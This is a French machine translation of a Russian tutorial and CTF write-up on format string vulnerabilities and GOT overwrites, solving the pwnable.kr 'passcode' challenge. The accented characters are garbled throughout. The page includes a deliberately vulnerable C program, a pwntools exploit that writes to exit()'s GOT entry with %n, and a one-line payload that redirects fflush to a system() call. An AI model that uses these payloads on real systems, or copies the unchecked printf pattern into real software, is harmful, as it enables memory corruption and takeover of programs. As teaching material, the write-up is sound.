<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üíÉ üåØ ü§ûüèΩ R√©soudre un travail avec pwnable.kr 05 - mot de passe. R√©√©crire la table des liens de proc√©dure via la vuln√©rabilit√© de cha√Æne de format üë®üèø‚Äçüîß ü¶ó üßëüèª</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Dans cet article nous analyserons: quelle est la table globale des offsets, la table des relations de proc√©dures et sa r√©√©criture √† travers la vuln√©ra...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>R√©soudre un travail avec pwnable.kr 05 - mot de passe. R√©√©crire la table des liens de proc√©dure via la vuln√©rabilit√© de cha√Æne de format</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/460647/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="image"></div><br>  Dans cet article nous analyserons: quelle est la table globale des offsets, la table des relations de proc√©dures et sa r√©√©criture √† travers la vuln√©rabilit√© de cha√Æne de format.  Nous r√©soudrons √©galement la 5√®me t√¢che √† partir du site <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">pwnable.kr</a> . <br><br><div class="spoiler">  <b class="spoiler_title">Information organisationnelle</b> <div class="spoiler_text">  Surtout pour ceux qui veulent apprendre quelque chose de nouveau et se d√©velopper dans l'un des domaines de l'information et de la s√©curit√© informatique, j'√©crirai et parlerai des cat√©gories suivantes: <br><br><ul><li>  PWN; </li><li>  cryptographie (Crypto); </li><li>  technologies de r√©seau (r√©seau); </li><li>  reverse (Reverse Engineering); </li><li>  st√©ganographie (Stegano); </li><li>  recherche et exploitation des vuln√©rabilit√©s WEB. </li></ul><br>  En plus de cela, je partagerai mon exp√©rience en criminalistique informatique, analyse de logiciels malveillants et micrologiciels, attaques sur les r√©seaux sans fil et r√©seaux locaux, r√©alisation de pentests et √©criture d'exploits. <br><a name="habracut"></a><br>  Afin que vous puissiez vous renseigner sur les nouveaux articles, logiciels et autres informations, j'ai cr√©√© une <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">cha√Æne dans Telegram</a> et un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">groupe pour discuter de tout probl√®me</a> dans le domaine de l'ICD.  Aussi, je consid√©rerai personnellement vos demandes, questions, suggestions et recommandations <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">personnelles et r√©pondrai √† tout le monde</a> . <br><cut></cut><br>  Toutes les informations sont fournies √† des fins √©ducatives uniquement.  L'auteur de ce document n'assume aucune responsabilit√© pour tout dommage caus√© √† quelqu'un du fait de l'utilisation des connaissances et des m√©thodes obtenues √† la suite de l'√©tude de ce document. <br></div></div><br><h2>  Tableau de d√©calage global et tableau de relation de proc√©dure </h2><br>  Les biblioth√®ques li√©es dynamiquement sont charg√©es √† partir d'un fichier distinct dans la m√©moire au d√©marrage ou √† l'ex√©cution.  Et, par cons√©quent, leurs adresses en m√©moire ne sont pas fixes afin d'√©viter les conflits de m√©moire avec d'autres biblioth√®ques.  De plus, le m√©canisme de s√©curit√© ASLR randomisera l'adresse de chaque module au d√©marrage. <br><br>  Global Offset Table (GOT) - Une table d'adresses stock√©es dans la section des donn√©es.  Il est utilis√© au moment de l'ex√©cution pour rechercher des adresses de variables globales inconnues au moment de la compilation.  Ce tableau se trouve dans la section des donn√©es et n'est pas utilis√© par tous les processus.  Toutes les adresses absolues r√©f√©renc√©es par la section de code sont stock√©es dans cette table GOT.  La section de code utilise des d√©calages relatifs pour acc√©der √† ces adresses absolues.  Et ainsi, le code de biblioth√®que peut √™tre partag√© par des processus, m√™me s'ils sont charg√©s dans diff√©rents espaces d'adressage m√©moire. <br><br>  La table de liaison de proc√©dure (PLT) contient un code de saut pour appeler des fonctions communes dont les adresses sont stock√©es dans le GOT, c'est-√†-dire que le PLT contient des adresses auxquelles les adresses sont stock√©es pour les donn√©es (adresses) du GOT. <br><br>  Consid√©rez le m√©canisme √† l'aide d'un exemple: <br><br><ol><li>  Dans le code du programme, la fonction externe printf est appel√©e. </li><li>  Le flux de contr√¥le va au ni√®me enregistrement dans le PLT, et la transition se produit √† un d√©calage relatif, plut√¥t qu'√† une adresse absolue. </li><li>  Va √† l'adresse stock√©e dans le GOT.  Le pointeur de fonction stock√© dans la table GOT pointe d'abord vers l'extrait de code PLT. </li><li>  Ainsi, si printf est appel√© pour la premi√®re fois, le convertisseur de l'√©diteur de liens dynamique est appel√© pour obtenir l'adresse r√©elle de la fonction cible. </li><li>  L'adresse printf est √©crite dans la table GOT, puis printf est appel√©e. </li><li>  Si printf est √† nouveau appel√© dans le code, le r√©solveur ne sera plus appel√© car l'adresse de printf est d√©j√† stock√©e dans GOT. </li></ol><cut></cut><br><img src="https://habrastorage.org/webt/j4/yh/xf/j4yhxfc-twcuo9m9e5o2nanwoug.png" alt="image"><br><br>  Lorsque vous utilisez cette liaison diff√©r√©e, les pointeurs vers des fonctions qui ne sont pas utilis√©es au moment de l'ex√©cution ne sont pas autoris√©s.  Ainsi, cela fait gagner beaucoup de temps. <br><br>  Pour que ce m√©canisme fonctionne, les sections suivantes sont pr√©sentes dans le fichier: <br><br><ul><li>  .got - contient des entr√©es pour GOT; </li><li>  .lt - contient des entr√©es pour PLT; </li><li>  .got.plt - contient les relations d'adresse GOT - PLT; </li><li>  .plt.got - contient les relations d'adresse PLT - GOT. </li></ul><br>  √âtant donn√© que la section .got.plt est un tableau de pointeurs et est remplie pendant l'ex√©cution du programme (c'est-√†-dire que l'√©criture y est autoris√©e), nous pouvons remplacer l'un d'eux et contr√¥ler le flux d'ex√©cution du programme. <br><br><h2>  Format de cha√Æne </h2><br>  Une cha√Æne de format est une cha√Æne utilisant des sp√©cificateurs de format.  Le sp√©cificateur de format est indiqu√© par le symbole ¬´%¬ª (pour saisir le signe de pourcentage, utilisez la s√©quence ¬´%%¬ª). <br><br><pre><code class="cpp hljs">pritntf(‚Äúoutput %s <span class="hljs-number"><span class="hljs-number">123</span></span>‚Äù, ‚Äústr‚Äù); output str <span class="hljs-number"><span class="hljs-number">123</span></span></code> </pre> <br>  Les sp√©cificateurs de format les plus importants: <br><br><ul><li>  d - nombre d√©cimal sign√©, taille par d√©faut, sizeof (int); </li><li>  x et X sont un nombre hexad√©cimal non sign√©, x utilise des lettres minuscules (abcdef), X majuscule (ABCDEF), la taille par d√©faut est sizeof (int); </li><li>  s - sortie ligne avec z√©ro octet de fin; </li><li>  n est le nombre de caract√®res √©crits au moment o√π la s√©quence de commandes contenant n est apparue. </li></ul><br><h2>  Pourquoi la vuln√©rabilit√© de cha√Æne de formatage est possible </h2><br>  Cette vuln√©rabilit√© consiste √† utiliser l'une des fonctions de sortie de format sans sp√©cifier de format (comme dans l'exemple suivant).  Ainsi, nous pouvons nous-m√™mes sp√©cifier le format de sortie, ce qui permet de lire les valeurs de la pile et, lors de la sp√©cification d'un format sp√©cial, d'√©crire dans la m√©moire. <br><cut></cut><br>  Consid√©rez la vuln√©rabilit√© dans l'exemple suivant: <br><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; int main(){ char input[100]; printf("Start program!!!\n"); printf("Input: "); scanf("%s", &amp;input); printf("\nYour input: "); printf(input); printf("\n"); exit(0); }</span></span></span></span></code> </pre> <br>  Ainsi, la ligne suivante ne sp√©cifie pas le format de sortie. <br><br><pre> <code class="cpp hljs"><span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(input);</code> </pre> <br>  Compilez le programme. <br><br><pre> <code class="bash hljs">gcc vuln1.c -o vuln -no-pie</code> </pre> <br>  Examinons les valeurs de la pile en entrant une ligne contenant des sp√©cificateurs de format. <br><br><img src="https://habrastorage.org/webt/i9/ib/es/i9ibeshbd2zhx5zmza0gxoegc-e.png" alt="image"><br><br>  Ainsi, lors de l'appel de printf (entr√©e), l'appel suivant est d√©clench√©: <br><br><pre> <code class="cpp hljs"><span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(‚Äú%p-%p-%p-%p-%p‚Äú);</code> </pre> <br>  Reste √† comprendre ce que le programme affiche.  La fonction printf a plusieurs arguments, qui sont des donn√©es pour une cha√Æne de format. <br><br>  Prenons un exemple d'appel de fonction avec les arguments suivants: <br><br><pre> <code class="cpp hljs"><span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(‚ÄúNumber - %d, addres - %<span class="hljs-number"><span class="hljs-number">08</span></span>x, <span class="hljs-built_in"><span class="hljs-built_in">string</span></span> - %s‚Äù, a, &amp;b, c);</code> </pre> <br>  Lorsque cette fonction est appel√©e, la pile se pr√©sente comme suit. <br><br><img src="https://habrastorage.org/webt/vo/rj/n2/vorjn2194dvix4kr4mmzutja890.png" alt="image"><br><br>  Ainsi, lorsqu'un sp√©cificateur de format est d√©tect√©, la fonction r√©cup√®re la valeur de la pile.  De m√™me, une fonction de notre exemple r√©cup√©rera 5 valeurs de la pile. <br><br><img src="https://habrastorage.org/webt/uj/_j/vc/uj_jvcokc0m81teugsjel-ovzsk.png" alt="image"><br><br>  Pour confirmer ce qui pr√©c√®de, nous trouvons notre cha√Æne de format dans la pile. <br><br><img src="https://habrastorage.org/webt/tm/og/pm/tmogpmxoiospc4wwcybi3daw-3u.png" alt="image"><br><br>  Lors de la traduction de valeurs √† partir d'une vue hexad√©cimale, nous obtenons la cha√Æne ¬´% -p% AAAA¬ª.  Autrement dit, nous avons pu obtenir les valeurs de la pile. <br><br><h2>  GOT Overwrite </h2><br>  V√©rifions la possibilit√© de r√©√©crire GOT via la vuln√©rabilit√© de cha√Æne de format.  Pour ce faire, bouclons notre programme en r√©√©crivant l'adresse de la fonction exit () √† l'adresse de main.  Nous remplacerons en utilisant pwntools.  Cr√©ez la disposition initiale et r√©p√©tez l'entr√©e pr√©c√©dente. <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * ex = process(<span class="hljs-string"><span class="hljs-string">'./vuln'</span></span>) payload = <span class="hljs-string"><span class="hljs-string">"AAAA%p-%p-%p-%p-%p-%p-%p-%p"</span></span> ex.sendline(payload) ex.interactive()</code> </pre> <br><img src="https://habrastorage.org/webt/ln/ej/lh/lnejlh85r86iny9le7wepst28mo.png" alt="image"><br><br>  Mais comme en fonction de la taille de la cha√Æne saisie, le contenu de la pile sera diff√©rent, nous nous assurerons que la charge d'entr√©e contiendra toujours le m√™me nombre de caract√®res saisis. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p-%p-%p-%p"</span></span>*<span class="hljs-number"><span class="hljs-number">5</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, ‚Äù*‚Äù)</code> </pre> <br><img src="https://habrastorage.org/webt/h8/sg/wg/h8sgwghgqjftpqreusafipcpz0s.png" alt="image"><br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p-%p-%p-%p"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, ‚Äù*‚Äù)</code> </pre> <br><img src="https://habrastorage.org/webt/gj/bw/d-/gjbwd-9aigcck02hc2k9og5nfve.png" alt="image"><br><br>  Maintenant, nous devons trouver l'adresse GOT des fonctions exit () et l'adresse de la fonction principale.  L'adresse principale sera trouv√©e en utilisant gdb. <br><br><img src="https://habrastorage.org/webt/fp/bm/nn/fpbmnn6xs2bquxngua1igncslnm.png" alt="image"><br><br>  L'adresse GOT de exit () peut √™tre trouv√©e en utilisant √† la fois gdb et objdump. <br><br><img src="https://habrastorage.org/webt/_a/2o/pm/_a2opmke0_snnf_hczyzh0xtl64.png" alt="image"><br><br><img src="https://habrastorage.org/webt/qj/dj/yp/qjdjypxsia_iz1clauydnmtwdgy.png" alt="image"><br><br><pre> <code class="bash hljs">objdump -R vuln</code> </pre> <br><img src="https://habrastorage.org/webt/sf/of/qo/sfofqo2pj9dyvb57yf9hsdc1uw8.png" alt="image"><br><br>  Nous √©crirons ces adresses dans notre programme. <br><br><pre> <code class="python hljs">main_addr = <span class="hljs-number"><span class="hljs-number">0x401162</span></span> exit_addr = <span class="hljs-number"><span class="hljs-number">0x404038</span></span></code> </pre> <br>  Vous devez maintenant r√©√©crire l'adresse.  Pour ajouter √† la pile l'adresse de la fonction exit () et les adresses qui se trouvent apr√®s, c'est-√†-dire  * (sortie ()) + 1, etc.  Vous pouvez l'ajouter en utilisant notre charge. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p-%p-%p-%p-"</span></span>*<span class="hljs-number"><span class="hljs-number">5</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">"*"</span></span>) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr+<span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre> <br>  Ex√©cutez et d√©terminez quel compte affiche l'adresse. <br><br><img src="https://habrastorage.org/webt/_f/pg/cj/_fpgcjghcjfywqnhdh8qd1mc1ak.png" alt="image"><br><br>  Ces adresses sont affich√©es aux positions 14 et 15. Vous pouvez afficher la valeur √† une position sp√©cifique comme suit. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%14$p"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">"*"</span></span>)</code> </pre> <br><img src="https://habrastorage.org/webt/xl/ss/3u/xlss3uiye9rnbwz9jxmn5skxcry.png" alt="image"><br><br>  Nous r√©√©crirons l'adresse en deux blocs.  Pour commencer, nous imprimerons 4 valeurs afin que nos adresses soient aux 2e et 4e positions. <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%p%14$p%p%15$p"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">"*"</span></span>)</code> </pre> <br><img src="https://habrastorage.org/webt/yw/sy/py/ywsypywco_6skjhhsw1qr40bupc.png" alt="image"><br><br>  Maintenant, nous divisons l'adresse de main () en deux blocs: <br><blockquote>  0x401162 <br><br>  1) 0x62 = 98 (√©crire √† 0x404038) <br>  2) 0x4011 - 0x62 = 16303 (√©crire √† l'adresse 0x404039) </blockquote><br><br>  Nous les √©crivons comme suit: <br><br><pre> <code class="python hljs">payload = (<span class="hljs-string"><span class="hljs-string">"%98p%14$n%16303p%15$n"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">'*'</span></span>)</code> </pre> <br>  Code complet: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pwn <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * start_addr = <span class="hljs-number"><span class="hljs-number">0x401162</span></span> exit_addr = <span class="hljs-number"><span class="hljs-number">0x404038</span></span> ex = process(<span class="hljs-string"><span class="hljs-string">'./vuln'</span></span>) payload = (<span class="hljs-string"><span class="hljs-string">"%98p%14$n%16303p%15$n"</span></span>).ljust(<span class="hljs-number"><span class="hljs-number">64</span></span>, <span class="hljs-string"><span class="hljs-string">'*'</span></span>) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr) payload += pack(<span class="hljs-string"><span class="hljs-string">"Q"</span></span>, exit_addr+<span class="hljs-number"><span class="hljs-number">1</span></span>) ex.sendline(payload) ex.interactive()</code> </pre> <br><img src="https://habrastorage.org/webt/qi/vg/vr/qivgvrhzkucvpzfs6s-zwftuuhk.png" alt="image"><br><br>  Ainsi, le programme est red√©marr√© au lieu de se terminer.  Nous avons r√©√©crit l'adresse exit (). <br><br><h2>  Solution de travail par mot de passe </h2><br>  Nous cliquons sur la premi√®re ic√¥ne avec la signature du mot de passe, et on nous dit que nous devons nous connecter via SSH avec le mot de passe guest. <br><br><img src="https://habrastorage.org/webt/h2/jc/tj/h2jctjxsee5hardpu6glunfg2fk.png" alt="image"><br><br>  Une fois connect√©, nous voyons la banni√®re correspondante. <br><br><img src="https://habrastorage.org/webt/-a/me/pp/-ameppolfflavwiv35qbkkgvg-8.png" alt="image"><br><br>  Voyons quels fichiers se trouvent sur le serveur, ainsi que les droits dont nous disposons. <br><br><pre> <code class="bash hljs">ls -l</code> </pre> <br><img src="https://habrastorage.org/webt/ds/2m/gv/ds2mgvxu30ah53peas04_wypwja.png" alt="image"><br><br>  Ainsi, nous pouvons lire le code source du programme, car il y a un droit de lecture pour tout le monde, et ex√©cuter le programme de mot de passe avec les droits du propri√©taire (le bit collant est d√©fini).  Voyons le r√©sultat du code. <br><br><img src="https://habrastorage.org/webt/ld/mj/wr/ldmjwru5rsabi6jyr9o8rrbt2ps.png" alt="image"><br><br>  Une erreur s'est produite dans la fonction login ().  Dans scanf (), le deuxi√®me argument n'est pas transmis l'adresse de la variable &amp; passcode1, mais la variable elle-m√™me, et non initialis√©.  Comme la variable n'a pas encore √©t√© initialis√©e, elle contient les ¬´ordures¬ª non √©crites qui sont rest√©es apr√®s l'ex√©cution des instructions pr√©c√©dentes.  Autrement dit, scanf () √©crira le num√©ro √† l'adresse, qui sera les donn√©es r√©siduelles. <br><br><img src="https://habrastorage.org/webt/vt/5m/w4/vt5mw46djsyiiqhn5h7veqoi8b4.png" alt="image"><br><br>  Ainsi, si avant d'appeler la fonction de connexion, nous pouvons contr√¥ler cette zone de m√©moire, alors nous pouvons √©crire n'importe quel nombre √† n'importe quelle adresse (en fait changer la logique du programme). <br><br>  √âtant donn√© que la fonction login () est appel√©e imm√©diatement apr√®s la fonction welcome (), ils ont les m√™mes adresses de trame de pile. <br><br><img src="https://habrastorage.org/webt/tj/zr/yi/tjzryim0sirg0i4t3agtqk4loty.png" alt="image"><br><br>  V√©rifions si nous pouvons √©crire des donn√©es vers le futur emplacement de passcode1.  Ouvrez le programme dans gdb et d√©montez les fonctions login () et welcome ().  Puisque scanf a deux param√®tres dans les deux cas, l'adresse de la variable sera d'abord transmise √† la fonction.  Ainsi, l'adresse de passcode1 est ebp-0x10 et le nom est ebp-0x70. <br><br><img src="https://habrastorage.org/webt/qv/sj/li/qvsjliyjrjehr1lmvptgi5piju4.png" alt="image"><br><br><img src="https://habrastorage.org/webt/5t/uy/z3/5tuyz3pptyf76e32xe2idow-rnm.png" alt="image"><br><br>  Maintenant, calculons l'adresse passcode1 par rapport au nom, √† condition que la valeur ebp soit la m√™me: <br><blockquote>  (&amp; nom) - (&amp; mot de passe1) = (ebp-0x70) - (ebp-0x10) = -96 <br>  &amp; passcode1 == &amp; nom + 96 </blockquote>  Autrement dit, les 4 derniers octets de nom - ce sont les ¬´ordures¬ª qui serviront d'adresse pour √©crire dans la fonction de connexion. <br><br>  Dans l'article, nous avons vu comment vous pouvez changer la logique de l'application en r√©√©crivant les adresses dans le GOT.  Faisons-le ici aussi.  Puisque scanf () est suivi de flush, alors √† l'adresse de cette fonction dans GOT, nous √©crivons l'adresse de l'instruction pour appeler la fonction system () pour lire le drapeau. <br><br><img src="https://habrastorage.org/webt/kx/8i/fk/kx8ifk5y4nzodxayzfdr0pyfjaa.png" alt="image"><br><br><img src="https://habrastorage.org/webt/hh/2l/sx/hh2lsxqchatzgvyhvzi_xqj8-ac.png" alt="image"><br><br><img src="https://habrastorage.org/webt/nc/vd/bw/ncvdbwjevpugfpt62no2jrnbumk.png" alt="image"><br><br>  Autrement dit, √† l'adresse 0x804a004, vous devez √©crire 0x80485e3 sous forme d√©cimale. <br><br><pre> <code class="bash hljs">python -c <span class="hljs-string"><span class="hljs-string">"print('A'*96 + '\x04\xa0\x04\x08' + str(0x080485e3))"</span></span> | ./passcode</code> </pre> <br><img src="https://habrastorage.org/webt/rh/pu/gf/rhpugfjpmu0ykmcgyc_geflsm5s.png" alt="image"><br><br>  En cons√©quence, nous obtenons 10 points, jusqu'√† pr√©sent, c'est la t√¢che la plus difficile. <br><br><img src="https://habrastorage.org/webt/mg/fm/0-/mgfm0-rba6sb8aehxzm583xrrg4.png" alt="image"><br><br>  Les fichiers de cet article sont joints √† la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">cha√Æne Telegram</a> .  Rendez-vous dans les articles suivants! <br><br>  Nous sommes dans un canal de t√©l√©gramme: un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">canal dans Telegram</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr460647/">https://habr.com/ru/post/fr460647/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr460635/index.html">CLRium # 6: Concurrence et parall√©lisme. Deux jours: du processeur √† l'async / attente</a></li>
<li><a href="../fr460637/index.html">Contr√¥le de la lumi√®re sur ZigBee</a></li>
<li><a href="../fr460641/index.html">YouTokenToMe: un outil pour la tokenisation rapide du texte de l'√©quipe VKontakte</a></li>
<li><a href="../fr460643/index.html">R√©partition uniforme des points sur une sph√®re</a></li>
<li><a href="../fr460645/index.html">Faire le bien faire le mal: √©crire du code diabolique avec Go, partie 1</a></li>
<li><a href="../fr460651/index.html">R√©union de la Society of Anonymous Testers: TMS, monitoring monitoring, search quality evaluation and native iOS tests</a></li>
<li><a href="../fr460655/index.html">Comment j'ai bris√© Telegram</a></li>
<li><a href="../fr460659/index.html">Utilisation de tuyaux pour pivoter</a></li>
<li><a href="../fr460661/index.html">Tout ce que vous devez savoir sur Node.js</a></li>
<li><a href="../fr460665/index.html">Projet de FAQ: Pourquoi les normes C ++ sont-elles publi√©es tous les trois ans?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>